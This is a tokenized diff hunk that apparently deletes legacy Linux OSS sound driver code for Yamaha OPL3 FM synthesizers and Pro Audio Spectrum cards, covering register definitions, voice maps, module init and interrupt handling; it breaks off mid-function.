"opl3_volume_method", ",", ".", "bender", "=", "opl3_bender", ",", ".", "alloc_voice", "=", "opl3_alloc_voice", ",", ".", "setup_voice", "=", "opl3_setup_voice", "}", ";", "static", "int", "opl3_init", "(", "int", "ioaddr", ",", "struct", "module", "*", "owner", ")", "{", "int", "i", ";", "int", "me", ";", "if", "(", "devc", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "opl3", ":", "Device", "control", "structure", "not", "initialized", ".", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "if", "(", "(", "me", "=", "sound_alloc_synthdev", "(", "))", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_WARNING", "\"", "opl3", ":", "Too", "many", "synthesizers", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "devc", "-", ">", "nr_voice", "=", "9", ";", "devc", "-", ">", "fm_info", ".", "device", "=", "0", ";", "devc", "-", ">", "fm_info", ".", "synth_type", "=", "SYNTH_TYPE_FM", ";", "devc", "-", ">", "fm_info", ".", "synth_subtype", "=", "FM_TYPE_ADLIB", ";", "devc", "-", ">", "fm_info", ".", "perc_mode", "=", "0", ";", "devc", "-", ">", "fm_info", ".", "nr_voices", "=", "9", ";", "devc", "-", ">", "fm_info", ".", "nr_drums", "=", "0", ";", "devc", "-", ">", "fm_info", ".", "instr_bank_size", "=", "SBFM_MAXINSTR", ";", "devc", "-", ">", "fm_info", ".", "capabilities", "=", "0", ";", "devc", "-", ">", "left_io", "=", "ioaddr", ";", "devc", "-", ">", "right_io", "=", "ioaddr", "+", "2", ";", "if", "(", "detected_model", "<", "=", "2", ")", "devc", "-", ">", "model", "=", "1", ";", "else", "{", "devc", "-", ">", "model", "=", "2", ";", "if", "(", "detected_model", "=", "=", "4", ")", "devc", "-", ">", "is_opl4", "=", "1", ";", "}", "opl3_operations", ".", "info", "=", "&", "devc", "-", ">", "fm_info", ";", "synth_devs", "[", "me", "]", "=", "&", "opl3_operations", ";", "if", "(", "owner", ")", "synth_devs", "[", "me", "]", "->", "owner", "=", "owner", ";", "sequencer_init", "(", ");", "devc", "-", ">", "v_alloc", "=", "&", "opl3_operations", ".", "alloc", ";", "devc", "-", ">", "chn_info", "=", "&", "opl3_operations", ".", "chn_info", "[", "0", "]", ";", "if", "(", "devc", "-", ">", "model", "=", "=", "2", ")", "{", "if", "(", "devc", "-", ">", "is_opl4", ")", "strcpy", "(", "devc", "-", ">", "fm_info", ".", "name", ",", "\"", "Yamaha", "OPL4", "/", "OPL3", "FM", "\"", ");", "else", "strcpy", "(", "devc", "-", ">", "fm_info", ".", "name", ",", "\"", "Yamaha", "OPL3", "\"", ");", "devc", "-", ">", "v_alloc", "-", ">", "max_voice", "=", "devc", "-", ">", "nr_voice", "=", "18", ";", "devc", "-", ">", "fm_info", ".", "nr_drums", "=", "0", ";", "devc", "-", ">", "fm_info", ".", "synth_subtype", "=", "FM_TYPE_OPL3", ";", "devc", "-", ">", "fm_info", ".", "capabilities", "|", "=", "SYNTH_CAP_OPL3", ";", "for", "(", "i", "=", "0", ";", "i", "<", "18", ";", "i", "+", "+)", "{", "if", "(", "pv_map", "[", "i", "]", ".", "ioaddr", "=", "=", "USE_LEFT", ")", "pv_map", "[", "i", "]", ".", "ioaddr", "=", "devc", "-", ">", "left_io", ";", "else", "pv_map", "[", "i", "]", ".", "ioaddr", "=", "devc", "-", ">", "right_io", ";", "}", "opl3_command", "(", "devc", "-", ">", "right_io", ",", "OPL3_MODE_REGISTER", ",", "OPL3_ENABLE", ")", ";", "opl3_command", "(", "devc", "-", ">", "right_io", ",", "CONNECTION_SELECT_REGISTER", ",", "0x00", ")", ";", "}", "else", "{", "strcpy", "(", "devc", "-", ">", "fm_info", ".", "name", ",", "\"", "Yamaha", "OPL2", "\"", ");", "devc", "-", ">", "v_alloc", "-", ">", "max_voice", "=", "devc", "-", ">", "nr_voice", "=", "9", ";", "devc", "-", ">", "fm_info", ".", "nr_drums", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "18", ";", "i", "+", "+)", "pv_map", "[", "i", "]", ".", "ioaddr", "=", "devc", "-", ">", "left_io", ";", "}", "conf_printf2", "(", "devc", "-", ">", "fm_info", ".", "name", ",", "ioaddr", ",", "0", ",", "-", "1", ",", "-", "1", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "SBFM_MAXINSTR", ";", "i", "+", "+)", "devc", "-", ">", "i_map", "[", "i", "]", ".", "channel", "=", "-", "1", ";", "return", "me", ";", "}", "static", "int", "me", ";", "static", "int", "io", "=", "-", "1", ";", "module_param_hw", "(", "io", ",", "int", ",", "ioport", ",", "0", ")", ";", "static", "int", "__init", "init_opl3", "(", "void", ")", "{", "printk", "(", "KERN_INFO", "\"", "YM3812", "and", "OPL", "-", "3", "driver", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", ",", "Rob", "Hooft", "1993", "-", "1996", "\\", "n", "\"", ");", "if", "(", "io", "!", "=", "-", "1", ")", "/", "*", "User", "loading", "pure", "OPL3", "module", "*", "/", "{", "if", "(", "!", "opl3_detect", "(", "io", ")", ")", "{", "return", "-", "ENODEV", ";", "}", "me", "=", "opl3_init", "(", "io", ",", "THIS_MODULE", ")", ";", "}", "return", "0", ";", "}", "static", "void", "__exit", "cleanup_opl3", "(", "void", ")", "{", "if", "(", "devc", "&", "&", "io", "!", "=", "-", "1", ")", "{", "if", "(", "devc", "-", ">", "base", ")", "{", "release_region", "(", "devc", "-", ">", "base", ",", "4", ")", ";", "if", "(", "devc", "-", ">", "is_opl4", ")", "release_region", "(", "devc", "-", ">", "base", "-", "8", ",", "2", ")", ";", "}", "kfree", "(", "devc", ")", ";", "devc", "=", "NULL", ";", "sound_unload_synthdev", "(", "me", ")", ";", "}", "}", "module_init", "(", "init_opl3", ")", ";", "module_exit", "(", "cleanup_opl3", ")", ";", "#", "ifndef", "MODULE", "static", "int", "__init", "setup_opl3", "(", "char", "*", "str", ")", "{", "/", "*", "io", "*", "/", "int", "ints", "[", "2", "]", ";", "str", "=", "get_options", "(", "str", ",", "ARRAY_SIZE", "(", "ints", ")", ",", "ints", ")", ";", "io", "=", "ints", "[", "1", "]", ";", "return", "1", ";", "}", "__setup", "(", "\"", "opl3", "=", "\",", "setup_opl3", ")", ";", "#", "endif", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "246", "+", "0", ",", "0", "@", "@", "/", "*", "*", "opl3_hw", ".", "h", "-", "Definitions", "of", "the", "OPL", "-", "3", "registers", "*", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "*", "*", "The", "OPL", "-", "3", "mode", "is", "switched", "on", "by", "writing", "0x01", ",", "to", "the", "offset", "5", "*", "of", "the", "right", "side", ".", "*", "*", "Another", "special", "register", "at", "the", "right", "side", "is", "at", "offset", "4", ".", "It", "contains", "*", "a", "bit", "mask", "defining", "which", "voices", "are", "used", "as", "4", "OP", "voices", ".", "*", "*", "The", "percussive", "mode", "is", "implemented", "in", "the", "left", "side", "only", ".", "*", "*", "With", "the", "above", "exceptions", "the", "both", "sides", "can", "be", "operated", "independently", ".", "*", "*", "A", "4", "OP", "voice", "can", "be", "created", "by", "setting", "the", "corresponding", "*", "bit", "at", "offset", "4", "of", "the", "right", "side", ".", "*", "*", "For", "example", "setting", "the", "rightmost", "bit", "(", "0x01", ")", "changes", "the", "*", "first", "voice", "on", "the", "right", "side", "to", "the", "4", "OP", "mode", ".", "The", "fourth", "*", "voice", "is", "made", "inaccessible", ".", "*", "*", "If", "a", "voice", "is", "set", "to", "the", "2", "OP", "mode", ",", "it", "works", "like", "2", "OP", "modes", "*", "of", "the", "original", "YM3812", "(", "AdLib", ")", ".", "In", "addition", "the", "voice", "can", "*", "be", "connected", "the", "left", ",", "right", "or", "both", "stereo", "channels", ".", "It", "can", "*", "even", "be", "left", "unconnected", ".", "This", "works", "with", "4", "OP", "voices", "also", ".", "*", "*", "The", "stereo", "connection", "bits", "are", "located", "in", "the", "FEEDBACK_CONNECTION", "*", "register", "of", "the", "voice", "(", "0xC0", "-", "0xC8", ")", ".", "In", "4", "OP", "voices", "these", "bits", "are", "*", "in", "the", "second", "half", "of", "the", "voice", ".", "*", "/", "/", "*", "*", "Register", "numbers", "for", "the", "global", "registers", "*", "/", "#", "define", "TEST_REGISTER", "0x01", "#", "define", "ENABLE_WAVE_SELECT", "0x20", "#", "define", "TIMER1_REGISTER", "0x02", "#", "define", "TIMER2_REGISTER", "0x03", "#", "define", "TIMER_CONTROL_REGISTER", "0x04", "/", "*", "Left", "side", "*", "/", "#", "define", "IRQ_RESET", "0x80", "#", "define", "TIMER1_MASK", "0x40", "#", "define", "TIMER2_MASK", "0x20", "#", "define", "TIMER1_START", "0x01", "#", "define", "TIMER2_START", "0x02", "#", "define", "CONNECTION_SELECT_REGISTER", "0x04", "/", "*", "Right", "side", "*", "/", "#", "define", "RIGHT_4OP_0", "0x01", "#", "define", "RIGHT_4OP_1", "0x02", "#", "define", "RIGHT_4OP_2", "0x04", "#", "define", "LEFT_4OP_0", "0x08", "#", "define", "LEFT_4OP_1", "0x10", "#", "define", "LEFT_4OP_2", "0x20", "#", "define", "OPL3_MODE_REGISTER", "0x05", "/", "*", "Right", "side", "*", "/", "#", "define", "OPL3_ENABLE", "0x01", "#", "define", "OPL4_ENABLE", "0x02", "#", "define", "KBD_SPLIT_REGISTER", "0x08", "/", "*", "Left", "side", "*", "/", "#", "define", "COMPOSITE_SINE_WAVE_MODE", "0x80", "/", "*", "Don", "'", "t", "use", "with", "OPL", "-", "3", "?", "*", "/", "#", "define", "KEYBOARD_SPLIT", "0x40", "#", "define", "PERCOSSION_REGISTER", "0xbd", "/", "*", "Left", "side", "only", "*", "/", "#", "define", "TREMOLO_DEPTH", "0x80", "#", "define", "VIBRATO_DEPTH", "0x40", "#", "define", "PERCOSSION_ENABLE", "0x20", "#", "define", "BASSDRUM_ON", "0x10", "#", "define", "SNAREDRUM_ON", "0x08", "#", "define", "TOMTOM_ON", "0x04", "#", "define", "CYMBAL_ON", "0x02", "#", "define", "HIHAT_ON", "0x01", "/", "*", "*", "Offsets", "to", "the", "register", "banks", "for", "operators", ".", "To", "get", "the", "*", "register", "number", "just", "add", "the", "operator", "offset", "to", "the", "bank", "offset", "*", "*", "AM", "/", "VIB", "/", "EG", "/", "KSR", "/", "Multiple", "(", "0x20", "to", "0x35", ")", "*", "/", "#", "define", "AM_VIB", "0x20", "#", "define", "TREMOLO_ON", "0x80", "#", "define", "VIBRATO_ON", "0x40", "#", "define", "SUSTAIN_ON", "0x20", "#", "define", "KSR", "0x10", "/", "*", "Key", "scaling", "rate", "*", "/", "#", "define", "MULTIPLE_MASK", "0x0f", "/", "*", "Frequency", "multiplier", "*", "/", "/", "*", "*", "KSL", "/", "Total", "level", "(", "0x40", "to", "0x55", ")", "*", "/", "#", "define", "KSL_LEVEL", "0x40", "#", "define", "KSL_MASK", "0xc0", "/", "*", "Envelope", "scaling", "bits", "*", "/", "#", "define", "TOTAL_LEVEL_MASK", "0x3f", "/", "*", "Strength", "(", "volume", ")", "of", "OP", "*", "/", "/", "*", "*", "Attack", "/", "Decay", "rate", "(", "0x60", "to", "0x75", ")", "*", "/", "#", "define", "ATTACK_DECAY", "0x60", "#", "define", "ATTACK_MASK", "0xf0", "#", "define", "DECAY_MASK", "0x0f", "/", "*", "*", "Sustain", "level", "/", "Release", "rate", "(", "0x80", "to", "0x95", ")", "*", "/", "#", "define", "SUSTAIN_RELEASE", "0x80", "#", "define", "SUSTAIN_MASK", "0xf0", "#", "define", "RELEASE_MASK", "0x0f", "/", "*", "*", "Wave", "select", "(", "0xE0", "to", "0xF5", ")", "*", "/", "#", "define", "WAVE_SELECT", "0xe0", "/", "*", "*", "Offsets", "to", "the", "register", "banks", "for", "voices", ".", "Just", "add", "to", "the", "*", "voice", "number", "to", "get", "the", "register", "number", ".", "*", "*", "F", "-", "Number", "low", "bits", "(", "0xA0", "to", "0xA8", ")", ".", "*", "/", "#", "define", "FNUM_LOW", "0xa0", "/", "*", "*", "F", "-", "number", "high", "bits", "/", "Key", "on", "/", "Block", "(", "octave", ")", "(", "0xB0", "to", "0xB8", ")", "*", "/", "#", "define", "KEYON_BLOCK", "0xb0", "#", "define", "KEYON_BIT", "0x20", "#", "define", "BLOCKNUM_MASK", "0x1c", "#", "define", "FNUM_HIGH_MASK", "0x03", "/", "*", "*", "Feedback", "/", "Connection", "(", "0xc0", "to", "0xc8", ")", "*", "*", "These", "registers", "have", "two", "new", "bits", "when", "the", "OPL", "-", "3", "mode", "*", "is", "selected", ".", "These", "bits", "controls", "connecting", "the", "voice", "*", "to", "the", "stereo", "channels", ".", "For", "4", "OP", "voices", "this", "bit", "is", "*", "defined", "in", "the", "second", "half", "of", "the", "voice", "(", "add", "3", "to", "the", "*", "register", "offset", ")", ".", "*", "*", "For", "4", "OP", "voices", "the", "connection", "bit", "is", "used", "in", "the", "*", "both", "halves", "(", "gives", "4", "ways", "to", "connect", "the", "operators", ")", ".", "*", "/", "#", "define", "FEEDBACK_CONNECTION", "0xc0", "#", "define", "FEEDBACK_MASK", "0x0e", "/", "*", "Valid", "just", "for", "1st", "OP", "of", "a", "voice", "*", "/", "#", "define", "CONNECTION_BIT", "0x01", "/", "*", "*", "In", "the", "4", "OP", "mode", "there", "is", "four", "possible", "configurations", "how", "the", "*", "operators", "can", "be", "connected", "together", "(", "in", "2", "OP", "modes", "there", "is", "just", "*", "AM", "or", "FM", ")", ".", "The", "4", "OP", "connection", "mode", "is", "defined", "by", "the", "rightmost", "*", "bit", "of", "the", "FEEDBACK_CONNECTION", "(", "0xC0", "-", "0xC8", ")", "on", "the", "both", "halves", ".", "*", "*", "First", "half", "Second", "half", "Mode", "*", "*", "+", "--", "-+", "*", "v", "|", "*", "0", "0", ">", "+-", "1", "-", "+-", "-", "2", "-", "-", "3", "-", "-", "4", "-", "->", "*", "*", "*", "*", "+", "--", "-+", "*", "|", "|", "*", "0", "1", ">", "+-", "1", "-", "+-", "-", "2", "-", "+", "*", "|", "->", "*", ">", "--", "3", "-", "--", "-", "4", "-", "+", "*", "*", "+", "--", "-+", "*", "|", "|", "*", "1", "0", ">", "+-", "1", "-", "+-", "--", "--", "+", "*", "|", "->", "*", ">", "--", "2", "-", "-", "3", "-", "-", "4", "-", "+", "*", "*", "+", "--", "-+", "*", "|", "|", "*", "1", "1", ">", "+-", "1", "-", "+-", "-+", "*", "|", "*", ">", "--", "2", "-", "-", "3", "-", "+-", ">", "*", "|", "*", ">", "--", "4", "-", "--", "-+", "*", "/", "#", "define", "STEREO_BITS", "0x30", "/", "*", "OPL", "-", "3", "only", "*", "/", "#", "define", "VOICE_TO_LEFT", "0x10", "#", "define", "VOICE_TO_RIGHT", "0x20", "/", "*", "*", "Definition", "table", "for", "the", "physical", "voices", "*", "/", "struct", "physical_voice_info", "{", "unsigned", "char", "voice_num", ";", "unsigned", "char", "voice_mode", ";", "/", "*", "0", "=", "unavailable", ",", "2", "=", "2", "OP", ",", "4", "=", "4", "OP", "*", "/", "unsigned", "short", "ioaddr", ";", "/", "*", "I", "/", "O", "port", "(", "left", "or", "right", "side", ")", "*", "/", "unsigned", "char", "op", "[", "4", "]", ";", "/", "*", "Operator", "offsets", "*", "/", "}", ";", "/", "*", "*", "There", "is", "18", "possible", "2", "OP", "voices", "*", "(", "9", "in", "the", "left", "and", "9", "in", "the", "right", ")", ".", "*", "The", "first", "OP", "is", "the", "modulator", "and", "2nd", "is", "the", "carrier", ".", "*", "*", "The", "first", "three", "voices", "in", "the", "both", "sides", "may", "be", "connected", "*", "with", "another", "voice", "to", "a", "4", "OP", "voice", ".", "For", "example", "voice", "0", "*", "can", "be", "connected", "with", "voice", "3", ".", "The", "operators", "of", "voice", "3", "are", "*", "used", "as", "operators", "3", "and", "4", "of", "the", "new", "4", "OP", "voice", ".", "*", "In", "this", "case", "the", "2", "OP", "voice", "number", "0", "is", "the", "'", "first", "half", "'", "and", "*", "voice", "3", "is", "the", "second", ".", "*", "/", "#", "define", "USE_LEFT", "0", "#", "define", "USE_RIGHT", "1", "static", "struct", "physical_voice_info", "pv_map", "[", "18", "]", "=", "{", "/", "*", "No", "Mode", "Side", "OP1", "OP2", "OP3", "OP4", "*", "/", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "{", "0", ",", "2", ",", "USE_LEFT", ",", "{", "0x00", ",", "0x03", ",", "0x08", ",", "0x0b", "}", "},", "{", "1", ",", "2", ",", "USE_LEFT", ",", "{", "0x01", ",", "0x04", ",", "0x09", ",", "0x0c", "}", "},", "{", "2", ",", "2", ",", "USE_LEFT", ",", "{", "0x02", ",", "0x05", ",", "0x0a", ",", "0x0d", "}", "},", "{", "3", ",", "2", ",", "USE_LEFT", ",", "{", "0x08", ",", "0x0b", ",", "0x00", ",", "0x00", "}", "},", "{", "4", ",", "2", ",", "USE_LEFT", ",", "{", "0x09", ",", "0x0c", ",", "0x00", ",", "0x00", "}", "},", "{", "5", ",", "2", ",", "USE_LEFT", ",", "{", "0x0a", ",", "0x0d", ",", "0x00", ",", "0x00", "}", "},", "{", "6", ",", "2", ",", "USE_LEFT", ",", "{", "0x10", ",", "0x13", ",", "0x00", ",", "0x00", "}", "},", "/", "*", "Used", "by", "percussive", "voices", "*", "/", "{", "7", ",", "2", ",", "USE_LEFT", ",", "{", "0x11", ",", "0x14", ",", "0x00", ",", "0x00", "}", "},", "/", "*", "if", "the", "percussive", "mode", "*", "/", "{", "8", ",", "2", ",", "USE_LEFT", ",", "{", "0x12", ",", "0x15", ",", "0x00", ",", "0x00", "}", "},", "/", "*", "is", "selected", "*", "/", "{", "0", ",", "2", ",", "USE_RIGHT", ",", "{", "0x00", ",", "0x03", ",", "0x08", ",", "0x0b", "}", "},", "{", "1", ",", "2", ",", "USE_RIGHT", ",", "{", "0x01", ",", "0x04", ",", "0x09", ",", "0x0c", "}", "},", "{", "2", ",", "2", ",", "USE_RIGHT", ",", "{", "0x02", ",", "0x05", ",", "0x0a", ",", "0x0d", "}", "},", "{", "3", ",", "2", ",", "USE_RIGHT", ",", "{", "0x08", ",", "0x0b", ",", "0x00", ",", "0x00", "}", "},", "{", "4", ",", "2", ",", "USE_RIGHT", ",", "{", "0x09", ",", "0x0c", ",", "0x00", ",", "0x00", "}", "},", "{", "5", ",", "2", ",", "USE_RIGHT", ",", "{", "0x0a", ",", "0x0d", ",", "0x00", ",", "0x00", "}", "},", "{", "6", ",", "2", ",", "USE_RIGHT", ",", "{", "0x10", ",", "0x13", ",", "0x00", ",", "0x00", "}", "},", "{", "7", ",", "2", ",", "USE_RIGHT", ",", "{", "0x11", ",", "0x14", ",", "0x00", ",", "0x00", "}", "},", "{", "8", ",", "2", ",", "USE_RIGHT", ",", "{", "0x12", ",", "0x15", ",", "0x00", ",", "0x00", "}", "}", "}", ";", "/", "*", "*", "DMA", "buffer", "calls", "*", "/", "@", "@", "-", "1", ",", "45", "+", "0", ",", "0", "@", "@", "#", "define", "ALLOW_SELECT", "#", "undef", "NO_INLINE_ASM", "#", "define", "SHORT_BANNERS", "#", "define", "MANUAL_PNP", "#", "undef", "DO_TIMINGS", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "ifdef", "__KERNEL__", "#", "include", "<", "linux", "/", "string", ".", "h", ">", "#", "include", "<", "linux", "/", "fs", ".", "h", ">", "#", "include", "<", "asm", "/", "dma", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "<", "asm", "/", "param", ".", "h", ">", "#", "include", "<", "linux", "/", "sched", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "ioport", ".", "h", ">", "#", "include", "<", "asm", "/", "page", ".", "h", ">", "#", "include", "<", "linux", "/", "vmalloc", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "linux", "/", "poll", ".", "h", ">", "#", "include", "<", "linux", "/", "pci", ".", "h", ">", "#", "endif", "#", "include", "<", "linux", "/", "soundcard", ".", "h", ">", "#", "define", "FALSE", "0", "#", "define", "TRUE", "1", "extern", "int", "sound_alloc_dma", "(", "int", "chn", ",", "char", "*", "deviceID", ")", ";", "extern", "int", "sound_open_dma", "(", "int", "chn", ",", "char", "*", "deviceID", ")", ";", "extern", "void", "sound_free_dma", "(", "int", "chn", ")", ";", "extern", "void", "sound_close_dma", "(", "int", "chn", ")", ";", "extern", "void", "reprogram_timer", "(", "void", ")", ";", "#", "define", "USE_AUTOINIT_DMA", "extern", "void", "*", "sound_mem_blocks", "[", "1024", "]", ";", "extern", "int", "sound_nblocks", ";", "#", "undef", "PSEUDO_DMA_AUTOINIT", "#", "define", "ALLOW_BUFFER_MAPPING", "extern", "const", "struct", "file_operations", "oss_sound_fops", ";", "@", "@", "-", "1", ",", "20", "+", "0", ",", "0", "@", "@", "/", "*", "From", "pas_card", ".", "c", "*", "/", "int", "pas_set_intr", "(", "int", "mask", ")", ";", "int", "pas_remove_intr", "(", "int", "mask", ")", ";", "unsigned", "char", "pas_read", "(", "int", "ioaddr", ")", ";", "void", "pas_write", "(", "unsigned", "char", "data", ",", "int", "ioaddr", ")", ";", "/", "*", "From", "pas_audio", ".", "c", "*", "/", "void", "pas_pcm_interrupt", "(", "unsigned", "char", "status", ",", "int", "cause", ")", ";", "void", "pas_pcm_init", "(", "struct", "address_info", "*", "hw_config", ")", ";", "/", "*", "From", "pas_mixer", ".", "c", "*", "/", "int", "pas_init_mixer", "(", "void", ")", ";", "/", "*", "From", "pas_midi", ".", "c", "*", "/", "void", "pas_midi_init", "(", "void", ")", ";", "void", "pas_midi_interrupt", "(", "void", ")", ";", "/", "*", "From", "pas2_mixer", ".", "c", "*", "/", "void", "mix_write", "(", "unsigned", "char", "data", ",", "int", "ioaddr", ")", ";", "@", "@", "-", "1", ",", "458", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "pas2_card", ".", "c", "*", "*", "Detection", "routine", "for", "the", "Pro", "Audio", "Spectrum", "cards", ".", "*", "/", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "pas2", ".", "h", "\"", "#", "include", "\"", "sb", ".", "h", "\"", "static", "unsigned", "char", "dma_bits", "[", "]", "=", "{", "4", ",", "1", ",", "2", ",", "3", ",", "0", ",", "5", ",", "6", ",", "7", "}", ";", "static", "unsigned", "char", "irq_bits", "[", "]", "=", "{", "0", ",", "0", ",", "1", ",", "2", ",", "3", ",", "4", ",", "5", ",", "6", ",", "0", ",", "1", ",", "7", ",", "8", ",", "9", ",", "0", ",", "10", ",", "11", "}", ";", "static", "unsigned", "char", "sb_irq_bits", "[", "]", "=", "{", "0x00", ",", "0x00", ",", "0x08", ",", "0x10", ",", "0x00", ",", "0x18", ",", "0x00", ",", "0x20", ",", "0x00", ",", "0x08", ",", "0x28", ",", "0x30", ",", "0x38", ",", "0", ",", "0", "}", ";", "static", "unsigned", "char", "sb_dma_bits", "[", "]", "=", "{", "0x00", ",", "0x40", ",", "0x80", ",", "0xC0", ",", "0", ",", "0", ",", "0", ",", "0", "}", ";", "/", "*", "*", "The", "Address", "Translation", "code", "is", "used", "to", "convert", "I", "/", "O", "register", "addresses", "to", "*", "be", "relative", "to", "the", "given", "base", "-", "register", "*", "/", "int", "pas_translate_code", "=", "0", ";", "static", "int", "pas_intr_mask", ";", "static", "int", "pas_irq", ";", "static", "int", "pas_sb_base", ";", "DEFINE_SPINLOCK", "(", "pas_lock", ")", ";", "#", "ifndef", "CONFIG_PAS_JOYSTICK", "static", "bool", "joystick", ";", "#", "else", "static", "bool", "joystick", "=", "1", ";", "#", "endif", "#", "ifdef", "SYMPHONY_PAS", "static", "bool", "symphony", "=", "1", ";", "#", "else", "static", "bool", "symphony", ";", "#", "endif", "#", "ifdef", "BROKEN_BUS_CLOCK", "static", "bool", "broken_bus_clock", "=", "1", ";", "#", "else", "static", "bool", "broken_bus_clock", ";", "#", "endif", "static", "struct", "address_info", "cfg", ";", "static", "struct", "address_info", "cfg2", ";", "char", "pas_model", "=", "0", ";", "static", "char", "*", "pas_model_names", "[", "]", "=", "{", "\"", "\",", "\"", "Pro", "AudioSpectrum", "+", "\",", "\"", "CDPC", "\"", ",", "\"", "Pro", "AudioSpectrum", "16", "\"", ",", "\"", "Pro", "AudioSpectrum", "16D", "\"", "}", ";", "/", "*", "*", "pas_read", "(", ")", "and", "pas_write", "(", ")", "are", "equivalents", "of", "inb", "and", "outb", "*", "These", "routines", "perform", "the", "I", "/", "O", "address", "translation", "required", "*", "to", "support", "other", "than", "the", "default", "base", "address", "*", "/", "unsigned", "char", "pas_read", "(", "int", "ioaddr", ")", "{", "return", "inb", "(", "ioaddr", "+", "pas_translate_code", ")", ";", "}", "void", "pas_write", "(", "unsigned", "char", "data", ",", "int", "ioaddr", ")", "{", "outb", "(", "(", "data", ")", ",", "ioaddr", "+", "pas_translate_code", ")", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "Begin", "of", "the", "Interrupt", "Handler", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "static", "irqreturn_t", "pasintr", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "int", "status", ";", "status", "=", "pas_read", "(", "0x0B89", ")", ";", "pas_write", "(", "status", ",", "0x0B89", ")", ";", "/", "*", "Clear", "interrupt", "*", "/", "if", "(", "status", "&", "0x08", ")", "{", "pas_pcm_interrupt", "(", "status", ",", "1", ")", ";", "status", "&", "=", "~", "0x08", ";", "}", "if", "(", "status", "&", "0x10", ")", "{", "pas_midi_interrupt", "(", ");", "status", "&", "=", "~", "0x10", ";", "}", "return", "IRQ_HANDLED", ";", "}", "int", "pas_set_intr", "(", "int", "mask", ")", "{", "if", "(", "!", "mask", ")", "return", "0", ";", "pas_intr_mask", "|", "=", "mask", ";", "pas_write", "(", "pas_intr_mask", ",", "0x0B8B", ")", ";", "return", "0", ";", "}", "int", "pas_remove_intr", "(", "int", "mask", ")", "{", "if", "(", "!", "mask", ")", "return", "0", ";", "pas_intr_mask", "&", "=", "~", "mask", ";", "pas_write", "(", "pas_intr_mask", ",", "0x0B8B", ")", ";", "return", "0", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "End", "of", "the", "Interrupt", "handler", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "Begin", "of", "the", "Initialization", "Code", "*", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "static", "int", "__init", "config_pas_hw", "(", "struct", "address_info", "*", "hw_config", ")", "{", "char", "ok", "=", "1", ";", "unsigned", "int_ptrs", ";", "/", "*", "scsi", "/", "sound", "interrupt", "pointers", "*", "/", "pas_irq", "=", "hw_config", "-", ">", "irq", ";", "pas_write", "(", "0x00", ",", "0x0B8B", ")", ";", "pas_write", "(", "0x36", ",", "0x138B", ")", ";", "pas_write", "(", "0x36", ",", "0x1388", ")", ";", "pas_write", "(", "0", ",", "0x1388", ")", ";", "pas_write", "(", "0x74", ",", "0x138B", ")", ";", "pas_write", "(", "0x74", ",", "0x1389", ")", ";", "pas_write", "(", "0", ",", "0x1389", ")", ";", "pas_write", "(", "0x80", "|", "0x40", "|", "0x20", "|", "1", ",", "0x0B8A", ")", ";", "pas_write", "(", "0x80", "|", "0x20", "|", "0x10", "|", "0x08", "|", "0x01", ",", "0xF8A", ")", ";", "pas_write", "(", "0x01", "|", "0x02", "|", "0x04", "|", "0x10", "/", "*", "*", "|", "*", "0x80", "*", "/", ",", "0xB88", ")", ";", "pas_write", "(", "0x80", "|", "(", "joystick", "?", "0x40", ":", "0", ")", ",", "0xF388", ")", ";", "if", "(", "pas_irq", "<", "0", "|", "|", "pas_irq", ">", "15", ")", "{", "printk", "(", "KERN_ERR", "\"", "PAS16", ":", "Invalid", "IRQ", "%", "d", "\"", ",", "pas_irq", ")", ";", "hw_config", "-", ">", "irq", "=", "-", "1", ";", "ok", "=", "0", ";", "}", "else", "{", "int_ptrs", "=", "pas_read", "(", "0xF38A", ")", ";", "int_ptrs", "=", "(", "int_ptrs", "&", "0xf0", ")", "|", "irq_bits", "[", "pas_irq", "]", ";", "pas_write", "(", "int_ptrs", ",", "0xF38A", ")", ";", "if", "(", "!", "irq_bits", "[", "pas_irq", "]", ")", "{", "printk", "(", "KERN_ERR", "\"", "PAS16", ":", "Invalid", "IRQ", "%", "d", "\"", ",", "pas_irq", ")", ";", "hw_config", "-", ">", "irq", "=", "-", "1", ";", "ok", "=", "0", ";", "}", "else", "{", "if", "(", "request_irq", "(", "pas_irq", ",", "pasintr", ",", "0", ",", "\"", "PAS16", "\"", ",", "hw_config", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "\"", "PAS16", ":", "Cannot", "allocate", "IRQ", "%", "d", "\\", "n", "\"", ",", "pas_irq", ")", ";", "hw_config", "-", ">", "irq", "=", "-", "1", ";", 